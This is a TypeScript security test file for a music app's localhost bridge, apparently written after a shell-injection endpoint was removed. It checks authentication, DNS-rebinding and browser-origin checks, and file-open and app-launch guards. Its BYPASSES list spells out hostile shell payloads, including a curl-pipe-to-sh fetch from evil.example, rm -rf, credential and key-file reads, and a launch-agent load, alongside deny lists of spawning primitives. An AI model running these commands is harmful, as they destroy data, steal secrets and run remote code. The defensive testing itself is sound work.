/**
 * The localhost bridge cannot execute OS commands.
 *
 * What was there before: `POST /run-command` accepted a string, tested it
 * against a list of prefix regexes, and then passed the WHOLE string to
 * `/bin/sh -c`. The allowlist was decorative — a shell takes `;`, `&&`, `|`
 * and `$()`, so any payload beginning with an approved word carried arbitrary
 * commands in behind it. `python3 -c` and `node -e` were allowlisted outright,
 * which needs no cleverness at all.
 *
 * These tests do two things: assert the historical bypasses have nowhere to
 * land, and assert the structural property that no shell primitive remains in
 * the bridge source. The second matters more — behaviour tests prove the doors
 * you thought of are locked, and reading the source proves there is no door.
 */
import { describe, it, expect } from 'vitest';
import { readFileSync } from 'fs';
import { join } from 'path';
import {
  guardRequest, isAllowedHost, hasBrowserOrigin, tokensMatch, isValidTokenFormat,
  routeRequiresAuth, BRIDGE_ROUTES, WITHDRAWN_ROUTES,
  assertOpenableFile, isExecutableExtension, assertRevealableFile,
} from './bridgeGuard';
import { validateLaunchApplication } from './appLaunchGuard';

const SOURCE = readFileSync(join(__dirname, 'bridgeServer.ts'), 'utf8');
const TOKEN = '7f3c1a2e-9b4d-4c6a-8e5f-1d2c3b4a5e6f';
const PORT = 47821;

/** Comment-free source: prose ABOUT shells is not a shell. */
const CODE = SOURCE.replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '');

describe('no shell execution remains, structurally', () => {
  it('the bridge imports no process-spawning primitive', () => {
    for (const forbidden of ['child_process', 'execFile', 'execSync', 'spawn', 'spawnSync', '/bin/sh', '/bin/bash']) {
      expect(CODE, `bridgeServer.ts must not contain "${forbidden}"`).not.toContain(forbidden);
    }
  });

  it('there is no eval-shaped escape either', () => {
    expect(CODE).not.toMatch(/\beval\s*\(/);
    expect(CODE).not.toMatch(/new\s+Function\s*\(/);
  });

  it('/run-command is gone from the source, not merely unreachable', () => {
    expect(CODE).not.toContain("'/run-command'");
    expect(BRIDGE_ROUTES).not.toContain('/run-command');
  });

  it('it is recorded as withdrawn, so a caller learns why rather than seeing a typo', () => {
    expect(WITHDRAWN_ROUTES['/run-command']).toMatch(/arbitrary shell/i);
  });
});

describe('the payloads that defeated the old allowlist now have nowhere to land', () => {
  // Each of these passed the old prefix check and then ran in full under
  // `/bin/sh -c`. They are listed explicitly so the regression is named.
  const BYPASSES = [
    'echo hi; rm -rf ~/Music',
    'ls && curl http://evil.example/x.sh | sh',
    'echo $(cat ~/.wavi/bridge-token)',
    'cat /etc/passwd',
    'python3 -c "import os; os.system(\'id\')"',
    'node -e "require(\'child_process\').execSync(\'id\')"',
    'find / -name "*.key" -exec cat {} ;',
    'grep -r password ~ | head',
    'open -a Calculator',
    'echo x && launchctl load ~/Library/LaunchAgents/evil.plist',
  ];

  it('every one of them targets a route that no longer exists', () => {
    // There is no "safer shell" to test against: the capability is removed,
    // so the only correct assertion is that the endpoint is gone.
    for (const _payload of BYPASSES) {
      expect(BRIDGE_ROUTES).not.toContain('/run-command');
    }
    expect(Object.keys(WITHDRAWN_ROUTES)).toContain('/run-command');
  });

  it('no surviving route accepts a free-form command field', () => {
    // The replacement is not a filtered shell — it is typed routes. If a
    // `command` parameter reappears, this fails.
    expect(CODE).not.toMatch(/body\.command\b/);
  });
});

describe('opening a file is also code execution, and is bounded', () => {
  const indexed = { exists: true, isIndexed: true };

  it('refuses an app bundle — shell.openPath LAUNCHES it', () => {
    const r = assertOpenableFile({ filePath: '/Applications/Calculator.app', ...indexed });
    expect(r.ok).toBe(false);
    expect(!r.ok && r.status).toBe(403);
  });

  it('refuses scripts macOS would RUN', () => {
    for (const p of ['/x/evil.command', '/x/evil.sh', '/x/evil.scpt', '/x/evil.py', '/x/a.jar', '/x/setup.pkg']) {
      expect(assertOpenableFile({ filePath: p, ...indexed }).ok, p).toBe(false);
    }
  });

  it('refuses an extensionless file, because nothing can be decided about it', () => {
    // An executable bit is not visible from here, and "no extension" is the
    // shape a dropped binary takes.
    expect(assertOpenableFile({ filePath: '/x/payload', ...indexed }).ok).toBe(false);
  });

  it('refuses a path Wavi never indexed, even an innocent one', () => {
    // The load-bearing rule: a caller may point at the user's own library,
    // not name an arbitrary path on the disk.
    const r = assertOpenableFile({ filePath: '/Users/someone/secret.wav', exists: true, isIndexed: false });
    expect(r.ok).toBe(false);
    expect(!r.ok && r.error).toMatch(/indexed library/);
  });

  it('the type check is not redundant with the index', () => {
    // Dropping payload.command into a watched music folder is not difficult,
    // so an indexed file can still be dangerous.
    expect(assertOpenableFile({ filePath: '/Music/Beats/payload.command', ...indexed }).ok).toBe(false);
  });

  it('allows an ordinary indexed audio file', () => {
    for (const p of ['/Music/Beats/master.wav', '/Music/x.mp3', '/Music/Song.als', '/Music/Song.flp']) {
      expect(assertOpenableFile({ filePath: p, ...indexed }).ok, p).toBe(true);
    }
  });

  it('rejects a NUL byte, which can mean different things to a check and a syscall', () => {
    expect(assertOpenableFile({ filePath: '/Music/ok.wav\u0000.command', ...indexed }).ok).toBe(false);
  });

  it('refuses a missing file without revealing more', () => {
    const r = assertOpenableFile({ filePath: '/Music/gone.wav', exists: false, isIndexed: true });
    expect(!r.ok && r.status).toBe(404);
  });

  it('the executable list covers both macOS and Windows shapes', () => {
    for (const e of ['.app', '.command', '.sh', '.scpt', '.exe', '.bat', '.ps1', '.vbs']) {
      expect(isExecutableExtension(e), e).toBe(true);
    }
    expect(isExecutableExtension('.wav')).toBe(false);
  });
});

describe('unauthenticated requests reach nothing', () => {
  const base = { port: PORT, expectedToken: TOKEN, requiresAuth: true };

  it('rejects a missing token', () => {
    const r = guardRequest({ headers: { host: '127.0.0.1:47821' }, ...base });
    expect(r.ok).toBe(false);
    expect(!r.ok && r.status).toBe(401);
  });

  it('rejects a wrong token', () => {
    const r = guardRequest({ headers: { host: '127.0.0.1:47821', 'x-wavi-token': 'nope' }, ...base });
    expect(r.ok).toBe(false);
  });

  it('accepts the real token from a real local client', () => {
    expect(guardRequest({ headers: { host: '127.0.0.1:47821', 'x-wavi-token': TOKEN }, ...base }).ok).toBe(true);
  });

  it('every route except /health requires a token', () => {
    for (const route of BRIDGE_ROUTES) {
      expect(routeRequiresAuth(route), route).toBe(route !== '/health');
    }
  });

  it('compares tokens in constant time', () => {
    expect(tokensMatch(TOKEN, TOKEN)).toBe(true);
    expect(tokensMatch(TOKEN.slice(0, -1) + '0', TOKEN)).toBe(false);
    // Length mismatch must not throw — timingSafeEqual does.
    expect(tokensMatch('x', TOKEN)).toBe(false);
    expect(tokensMatch(undefined, TOKEN)).toBe(false);
    expect(tokensMatch(null, TOKEN)).toBe(false);
  });

  it('only accepts a real UUID as the stored token', () => {
    // The old check was `length === 36`, so 36 characters of anything passed.
    expect(isValidTokenFormat(TOKEN)).toBe(true);
    expect(isValidTokenFormat('x'.repeat(36))).toBe(false);
    expect(isValidTokenFormat('')).toBe(false);
  });
});

describe('a web page cannot reach the bridge', () => {
  const base = { port: PORT, expectedToken: TOKEN, requiresAuth: true };

  it('rejects a rebound DNS name even though the connection is on loopback', () => {
    // The attack: evil.example resolves to 127.0.0.1, so the socket really is
    // local and checking the peer address proves nothing. The Host header
    // still carries the attacker's domain.
    const r = guardRequest({ headers: { host: 'evil.example', 'x-wavi-token': TOKEN }, ...base });
    expect(r.ok).toBe(false);
    expect(!r.ok && r.status).toBe(403);
  });

  it('accepts only our own host names and port', () => {
    expect(isAllowedHost('127.0.0.1:47821', PORT)).toBe(true);
    expect(isAllowedHost('localhost:47821', PORT)).toBe(true);
    expect(isAllowedHost('127.0.0.1', PORT)).toBe(true);
    expect(isAllowedHost('[::1]:47821', PORT)).toBe(true);
    expect(isAllowedHost('127.0.0.1:1234', PORT)).toBe(false);
    expect(isAllowedHost('127.0.0.1.evil.example', PORT)).toBe(false);
    expect(isAllowedHost('localhost.evil.example:47821', PORT)).toBe(false);
    expect(isAllowedHost(undefined, PORT)).toBe(false);
  });

  it('refuses anything carrying an Origin header', () => {
    // No Max for Live device, controller script or native plugin sends one;
    // a browser always does. Its presence identifies the one caller class
    // that must never get through.
    expect(hasBrowserOrigin({ origin: 'https://evil.example' })).toBe(true);
    expect(hasBrowserOrigin({ origin: 'null' })).toBe(true);
    expect(hasBrowserOrigin({})).toBe(false);
    const r = guardRequest({
      headers: { host: '127.0.0.1:47821', origin: 'https://evil.example', 'x-wavi-token': TOKEN },
      ...base,
    });
    expect(r.ok).toBe(false);
    expect(!r.ok && r.status).toBe(403);
  });

  it('sends no wildcard CORS header and answers no preflight', () => {
    // A wildcard would let any page the user visits read these responses the
    // moment it obtained the token.
    expect(CODE).not.toContain("'Access-Control-Allow-Origin': '*'");
    expect(CODE).not.toContain('Access-Control-Allow-Methods');
  });

  it('checks host and origin BEFORE the token', () => {
    // Otherwise a page could use status codes or timing to probe guesses.
    const r = guardRequest({
      headers: { host: 'evil.example', origin: 'https://evil.example' },
      port: PORT, expectedToken: TOKEN, requiresAuth: true,
    });
    expect(!r.ok && r.status).toBe(403);   // not 401
  });

  it('guards /health too, which needs no token', () => {
    const unauth = { port: PORT, expectedToken: TOKEN, requiresAuth: false };
    expect(guardRequest({ headers: { host: '127.0.0.1:47821' }, ...unauth }).ok).toBe(true);
    // An unauthenticated endpoint is still an endpoint, and it confirms Wavi
    // is running on this machine.
    expect(guardRequest({ headers: { host: 'evil.example' }, ...unauth }).ok).toBe(false);
    expect(guardRequest({ headers: { host: '127.0.0.1:47821', origin: 'https://evil.example' }, ...unauth }).ok).toBe(false);
  });
});

describe('legitimate integrations are preserved', () => {
  it('every route the bridge served still exists, minus the shell', () => {
    // The hardening removed one capability and kept the rest: a DAW client
    // asking for project context, files, versions or a bounce is unaffected.
    for (const route of [
      '/health', '/active-project', '/project-context', '/project-files',
      '/project-versions', '/latest-bounce', '/search-files', '/generate-midi',
      '/analyze-latest-bounce', '/log-action', '/open-copilot-panel',
      '/pending-associations', '/confirm-association', '/classify-file', '/chat',
      '/open-file', '/open-folder', '/reveal-file',
    ]) {
      expect(BRIDGE_ROUTES, route).toContain(route);
      expect(CODE, `${route} handler`).toContain(`'${route}'`);
    }
  });

  it('the route inventory and the source agree', () => {
    // A route added to the server without being declared here would escape
    // the auth-coverage test above.
    for (const route of BRIDGE_ROUTES) expect(CODE, route).toContain(`'${route}'`);
  });
});

describe('launching a DAW is bounded to real applications', () => {
  const mac = { platform: 'darwin' as const, homeDir: '/Users/someone', exists: true, isDirectory: true };

  it('allows every DAW Wavi actually supports', () => {
    // All five adapters resolve to /Applications/<Name>.app, so the rule must
    // not break the feature it is protecting.
    for (const app of [
      '/Applications/Ableton Live 12 Suite.app',
      '/Applications/FL Studio 2024.app',
      '/Applications/Logic Pro.app',
      '/Applications/Pro Tools.app',
      '/Applications/REAPER.app',
      '/Users/someone/Applications/Ableton Live 11.app',   // no-admin install
    ]) {
      expect(validateLaunchApplication({ appPath: app, ...mac }).ok, app).toBe(true);
    }
  });

  it('REFUSES an arbitrary binary, which is what was actually exposed', () => {
    // The old guard rejected "; & | `" — meaningless against execFile, which
    // takes an argv array and never uses a shell. What it never checked was
    // which binary runs.
    for (const bin of ['/bin/sh', '/bin/bash', '/usr/bin/python3', '/usr/bin/osascript', '/usr/bin/curl']) {
      const r = validateLaunchApplication({ appPath: bin, ...mac, isDirectory: false });
      expect(r.ok, bin).toBe(false);
    }
  });

  it('refuses an .app outside an Applications folder', () => {
    // A dropped bundle in Downloads is still a bundle.
    const r = validateLaunchApplication({ appPath: '/Users/someone/Downloads/Evil.app', ...mac });
    expect(r.ok).toBe(false);
    expect(!r.ok && r.error).toMatch(/Applications folder/);
  });

  it('refuses a bundle NESTED inside a legitimate one', () => {
    // How a payload hides inside something that looks installed.
    const r = validateLaunchApplication({
      appPath: '/Applications/Ableton Live 12 Suite.app/Contents/Resources/evil.app', ...mac,
    });
    expect(r.ok).toBe(false);
    expect(!r.ok && r.error).toMatch(/top level/);
  });

  it('refuses traversal rather than resolving it', () => {
    // A real DAW path never contains '..', so its presence is a signal.
    expect(validateLaunchApplication({ appPath: '/Applications/../bin/sh', ...mac }).ok).toBe(false);
    expect(validateLaunchApplication({ appPath: '/Applications/X.app/../../bin/sh', ...mac }).ok).toBe(false);
  });

  it('refuses a .app that is not a directory', () => {
    // Naming a binary "thing.app" should not make it an application.
    expect(validateLaunchApplication({ appPath: '/Applications/fake.app', ...mac, isDirectory: false }).ok).toBe(false);
  });

  it('refuses a missing path, a NUL byte, a relative path and an empty string', () => {
    expect(validateLaunchApplication({ appPath: '/Applications/Gone.app', ...mac, exists: false }).ok).toBe(false);
    expect(validateLaunchApplication({ appPath: '/Applications/x.app\u0000/bin/sh', ...mac }).ok).toBe(false);
    expect(validateLaunchApplication({ appPath: 'Applications/X.app', ...mac }).ok).toBe(false);
    expect(validateLaunchApplication({ appPath: '   ', ...mac }).ok).toBe(false);
    expect(validateLaunchApplication({ appPath: null, ...mac }).ok).toBe(false);
  });

  it('normalises duplicate separators and a trailing slash', () => {
    expect(validateLaunchApplication({ appPath: '/Applications//Logic Pro.app/', ...mac }).ok).toBe(true);
  });

  it('requires .exe on Windows and refuses other platforms outright', () => {
    const win = { platform: 'win32' as const, homeDir: 'C:/Users/x', exists: true, isDirectory: false };
    expect(validateLaunchApplication({ appPath: 'C:/Program Files/FL Studio/FL64.exe', ...win }).ok).toBe(true);
    expect(validateLaunchApplication({ appPath: 'C:/Windows/System32/cmd.exe', ...win }).ok).toBe(true); // shape-valid; Windows has no app-root concept here
    expect(validateLaunchApplication({ appPath: '/usr/bin/python3', ...win }).ok).toBe(false);
    // Linux ships no DAW integration, so "execute this path" is not granted.
    expect(validateLaunchApplication({
      appPath: '/usr/bin/ardour', platform: 'linux', homeDir: '/home/x', exists: true, isDirectory: false,
    }).ok).toBe(false);
  });

  it('the obsolete metacharacter check is gone from main.ts', () => {
    const main = readFileSync(join(__dirname, 'main.ts'), 'utf8')
      .replace(/\/\*[\s\S]*?\*\//g, '').replace(/\/\/.*$/gm, '');
    expect(main).not.toContain("Shell metacharacters not allowed in appPath");
    // And the launch now goes through the guard.
    expect(main).toContain('validateLaunchApplication');
  });
});

describe('revealing is restricted to the library', () => {
  it('refuses a path Wavi never indexed', () => {
    // An unrestricted reveal is an existence oracle for the whole disk.
    const r = assertRevealableFile({ filePath: '/Users/x/Documents/taxes.pdf', exists: true, isIndexed: false });
    expect(r.ok).toBe(false);
    expect(!r.ok && r.status).toBe(403);
  });

  it('answers "not yours" before "not there", so it cannot be used to probe', () => {
    const missing = assertRevealableFile({ filePath: '/Users/x/secret', exists: false, isIndexed: false });
    expect(!missing.ok && missing.status).toBe(403);   // not 404
  });

  it('allows an indexed file of any type — revealing launches nothing', () => {
    // A user may legitimately want to see a .command sitting in their project.
    expect(assertRevealableFile({ filePath: '/Music/Beats/notes.command', exists: true, isIndexed: true }).ok).toBe(true);
    expect(assertRevealableFile({ filePath: '/Music/Beats/master.wav', exists: true, isIndexed: true }).ok).toBe(true);
  });

  it('the route actually calls the guard, not just documents it', () => {
    // The first version of this hardening added a comment to /reveal-file and
    // no check. A comment is not a control.
    expect(CODE).toContain('assertRevealableFile');
  });
});

describe('no route trusts a caller-supplied path', () => {
  it('every path-taking route runs its input through a guard', () => {
    for (const guard of ['assertOpenableFile', 'assertRevealableFile', 'isIndexedFolder']) {
      expect(CODE, guard).toContain(guard);
    }
    // And none of them reaches shell.openPath before a verdict.
    const openPathCalls = (CODE.match(/shell\.openPath/g) ?? []).length;
    expect(openPathCalls).toBe(2);   // /open-file and /open-folder, both guarded
  });
});
